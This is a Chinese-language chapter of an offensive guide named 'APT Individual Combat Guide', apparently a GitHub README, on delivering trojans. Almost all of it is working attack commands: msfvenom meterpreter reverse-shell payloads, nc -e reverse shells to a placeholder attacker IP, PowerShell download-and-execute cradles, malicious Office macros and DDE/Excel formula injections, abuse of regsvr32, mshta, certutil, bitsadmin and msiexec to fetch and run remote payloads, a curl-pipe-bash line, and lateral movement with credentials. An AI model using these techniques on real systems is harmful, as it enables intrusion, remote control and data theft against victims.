# 木马投递

## 恶意软件伪装

### 文件伪装

1. 快捷方式伪装

(1)

[lnk.ps1](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/lnk.ps1)

(2)

[ico.ps1](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/ico.ps1)

[download.ps1](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/download.ps1)

hi.exe:

```bash
msfvenom -p windows/x64/messagebox TEXT='There is payload!' TITLE='Ghost Wolf Lab' -f exe > hi.exe
```

(3)

[ole.ps1](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/ole.ps1)

nc.cmd:

```bash
C:\Users\Administrator\Desktop\nc.exe IP地址 4444 -e cmd.exe  
//嵌入攻击者主机IP地址
```

2. CHM文件

[nc.html](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/nc.html)

```bash
nc -lvp 4444
```

nishang:

```bash
Import-Module .\Out-CHM.ps1
out-chm -payload "C:\Users\Administrator\Desktop\nc.exe -e powershell IP地址 5555" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
nc -lvp 5555
```

3. IQY文件

test.iqy:

```bash
WEB
1
https://www.baidu.com/robots.txt
```

calc.dat:

```bash
=cmd|' /C calc'!notthissheet
```

calc.iqy:

```bash
WEB
1
http://IP地址/payload/calc.dat
```

(1)

```bash
Start-CaptureServer -AuthType Basic -IPAddress IP地址 -LogFilePath log.txt
```

login.dat:

```bash
=cmd|' /C start iexplore http://IP地址/'!notthissheet
```

auth.iqy:

```bash
WEB
1
http://IP地址/payload/login.dat
```

(2)

```bash
=cmd|' /C C:\Users\Administrator\Desktop\nc.exe IP地址 4444 -e cmd.exe'!notthissheet
```

```bash
=cmd|' /C powershell.exe "IEX(New-Object Net.WebClient).DownloadString('http://IP地址/nishang/Shells/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress IP地址 -Port 4444"'!notthissheet
```

4. REG文件

[malicious.reg](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/malicious.reg)

5. VBS文件

[evil.vbs](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/evil.vbs)

6. JScript文件

[evil.js](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/evil.js)

7. ISO文件

```bash
apt-get install genisoimage
mkisofs -o malicious.iso -V "Update" -J -R hi.exe
```

8. MSI文件

```bash
msfvenom执行msfvenom -p windows/x64/messagebox TEXT='Hi,There is a payload!' TITLE='Ghost Wolf Lab' -f msi > evil.msi
```

9. SCR文件

```bash
msfvenom执行msfvenom -p windows/x64/messagebox TEXT='Hi,There is a payload!' TITLE='Ghost Wolf Lab' -f exe > payload.exe
payload.exe > payload.scr
```

10. 联系人文件

(1)

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=IP地址 lport=4444 -f dll > shell.dll
```

```bash
http.\\www.ghostwolflab.com.cpl
shell.dll > www.ghostwolflab.com.cpl
```

(2)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP地址 LPORT=5555 -f vbs > shell.vbs
```

```bash
<a href="vbs\shell.vbs">snowwolf@admin.com</a>
```

11. CPL文件

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=IP地址 lport=4444 -f dll > shell.dll
```

### 宏病毒

弹窗宏:

```vba
Private Sub Document_Open()
  MsgBox "Hi,I am snowwolf.", vbOKOnly, "Ghost Wolf Lab"
End Sub
```

1. Metasploit框架生成宏

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP地址 LPORT=4444 -f vba-psh > vba
```

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP地址 LPORT=4444 -f vba-exe
```

2. 页面替换宏

[page.vba](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/page.vba)

3. Regsvr32方法

[evil.sct](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/evil.sct)

[Regsvr32下载](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/Regsvr32下载)

4. Author属性

```bash
powershell -NoP -ExecutionPolicy Bypass -Command IEX ((New-Object Net.WebClient).DownloadString('http://IP地址/payload/hacker.ps1'))
```

hacker.ps1 > msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP地址 LPORT=4444 -f psh-cmd

```bash
Sub AutoOpen()
    ' 读取Author属性中的恶意代码
    Dim strCmd As String
    strCmd = ActiveDocument.BuiltInDocumentProperties("Author").Value
    ' 执行恶意代码
    Shell strCmd, vbHide
End Sub
```

5. 基于ActiveX的自动运行宏

[嵌入ActiveX自动运行宏](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/嵌入ActiveX自动运行宏)

active.ps1 > msfvenom -p windows/x64/messagebox TEXT='Hi,I am Snowwolf' TITLE='Ghost Wolf Lab' -f psh-cmd > active.ps1

6. 基于Certutil直接下载并运行

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP地址 LPORT=4444 -f exe > cer.exe
```

[Certutil下载并运行](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/Certutil下载并运行)

7. 远程模板注入

[远程模板VBA](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/远程模板VBA)

file name = http://192.168.0.189/payload/evil.dotm

8. DDE

```bash
{DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://IP地址/payload/active.ps1')"}
```

Excel:

```bash
=cmd|'/c cmd.exe /c powershell.exe -nop -w hidden iwr -outf %tmp%\\excel.vbs http://IP地址/payload/excel.vbs & %tmp%\\excel.vbs'!'A1'
```

excel.vbs:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP地址 LPORT=4444 -f vbs > excel.vbs
```

9. Excel XLM宏

```bash
=EXEC("C:\\Users\\Administrator\\Desktop\\nc.cmd")
=HALT()
```

### 文件捆绑

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP地址 LPORT=443 -f exe > shell.exe
```

[file_bundler.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/file_bundler.py)

```bash
python file_bundler.py --legit hi.exe --evil shell.exe --output bundled_installer.exe
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP地址 LPORT=443 -x hi.exe -k -f exe > shell.exe
```

### 自解压

## 白名单

### regsvr32

[payload.sct](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E7%99%BD%E5%90%8D%E5%8D%95/payload.sct)

```bash
regsvr32 /u /n /s /i:http://IP地址/payload/white/payload.sct scrobj.dll
regsvr32 /u /n /s /i:\\IP地址\payload\white\payload.sct scrobj.dll
```

### mshta

[mshta.sct](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E7%99%BD%E5%90%8D%E5%8D%95/mshta.sct)

```bash
mshta.exe javascript:a=(GetObject("script:http://IP地址/payload/white/mshta.sct")).Exec();close();
```

[mshta.hta](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E7%99%BD%E5%90%8D%E5%8D%95/mshta.hta)

```bash
mshta.exe http://IP地址/payload/white/mshta.hta
```

```bash
use exploit/windows/misc/hta_server
```

### rundll32

```bash
rundll32.exe C:\path\to\malicious.dll,EntryPoint
```

[rundll32.sct](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E7%99%BD%E5%90%8D%E5%8D%95/rundll32.sct)

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://IP地址/payload/white/rundll32.sct")
```

```bash
use exploit/windows/smb/smb_delivery
rundll32.exe \\IP地址\kTLnvu\test.dll,0
```

### WMIC

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP地址 LPORT=4444 -f psh-cmd > evil.ps1
wmic process call create "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://IP地址/payload/white/evil.ps1')"
```

[payload.xsl](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E7%99%BD%E5%90%8D%E5%8D%95/payload.xsl)

```bash
wmic os get /format:"http://IP地址/payload/white/payload.xsl"
or
wmic os get /format:"payload.xsl"
```

### certutil

```bash
certutil -urlcache -split -f http://IP地址/payload/white/evil.exe evil.exe
.\evil.exe
```

```bash
msfvenom -p windows/x64/messagebox TEXT='Hi,I am Snowwolf' TITLE='Ghost Wolf Lab' -f dll > evil.txt
```

```bash
certutil -urlcache -split -f http://IP地址/payload/white/evil.txt dll.txt | certutil -encode dll.txt edll.txt
certutil -decode .\edll.txt hacker.dll
regsvr32 /s /u .\hacker.dll
```

### msiexec

```bash
msfvenom -p windows/x64/messagebox TEXT='Hi,I am evil msi!' TITLE='Ghost Wolf Lab' -f msi > hi.msi
msiexec /i http://IP地址/payload/white/hi.msi /quiet /qn /norestart
```

```bash
mv hi.msi hi.png
msiexec /i http://IP地址 /payload/white/hi.png /quiet /qn /norestart
```

### MSBuild

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP地址 LPORT=2233 -f exe > evil_msbuild.exe
```

[hello.xml](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E7%99%BD%E5%90%8D%E5%8D%95/hello.xml)

```bash
.\MSBuild.exe C:\Users\Administrator\Desktop\test\payload\white\hello.xml
```

### BITSAdmin

1. 下载恶意文件

```bash
bitsadmin /create /download whoami
bitsadmin /addfile whoami http://IP地址/payload/white/hi.exe C:\Users\Administrator\Desktop\test\payload\white\hi.exe
bitsadmin /resume whoami
bitsadmin /complete whoami
```

2. PowerShell命令

```bash
Start-BitsTransfer -Source http://IP地址/payload/white/powershell.exe -Destination C:\Users\Administrator\Desktop\test\payload\white\powershell.exe
```

3. Metasploit获取会话

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP地址 LPORT=5555 -f exe > bits.exe
```

```bash
bitsadmin /create snowwolf
bitsadmin /addfile snowwolf  http://IP地址/payload/white/bits.exe C:\Users\Administrator\Desktop\test\payload\white\bits.exe
bitsadmin /SetNotifyCmdLine snowwolf cmd.exe "/c bitsadmin.exe /complete snowwolf | start C:\Users\Administrator\Desktop\test\payload\white\bits.exe"
bitsadmin /resume snowwolf
```

4. 无文件托管

```bash
use exploit/multi/script/web_delivery
```

```bash
bitsadmin /create nullfile
bitsadmin /addfile nullfile http://IP地址/payload/white/hello.txt C:\Users\Administrator\Desktop\hello.txt
bitsadmin /SetNotifyCmdLine nullfile regsvr32 "/s /n /u /i:http://IP地址:8080/1flQYHW.sct scrobj.dll"
bitsadmin /resume nullfile
```

### Regasm

[regasm.cs](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E7%99%BD%E5%90%8D%E5%8D%95/regasm.cs)

```bash
$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content key.snk -Value $Content -Encoding Byte
.\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk C:\Users\Administrator\Desktop\regasm.cs
.\RegAsm.exe regsvcs.dll
```

### InstallUtil

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP地址 LPORT=4444 -f psh-cmd > evil.ps1
```

[evil.cs](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E7%99%BD%E5%90%8D%E5%8D%95/evil.cs)

```bash
.\csc.exe  /target:library /out:MaliciousAssembly.dll C:\Users\Administrator\Desktop\evil.cs
.\InstallUtil.exe /u .\MaliciousAssembly.dll
```

### FTP

```bash
echo open FTP服务器IP地址>ftp.txt&echo snowwolf>>ftp.txt&echo 123qwe>>ftp.txt&echo get evil.exe>>ftp.txt&echo quit>>ftp.txt&@ftp -s:ftp.txt & evil.exe
```

### Microsoft Office套件

```bash
WINWORD.EXE http://IP地址/payload/white/active.docm
EXCEL.exe
POWERPNT.exe
```

### WLS

```bash
wsl --status
wsl --install
wsl bash -c "curl http://malicious-site.com/payload.sh | bash"
```

### IPC$

```bash
net share ipc$
```

```bash
net use \\IP地址\ipc$ /user:用户名 "密码"
copy \\IP地址\c$\Users\snowwolf\Desktop\payload\evil.exe C:\Users\Administrator\Desktop\evil.exe
```

1. 执行远程命令

```bash
wmic /node:"IP地址" /user:"用户名" /password:"密码" process call create "cmd.exe /c calc.exe"
```

2. 横向移动

```bash
net view \\IP地址
net use Z: \\IP地址\payload /u:"用户名" "密码"
```
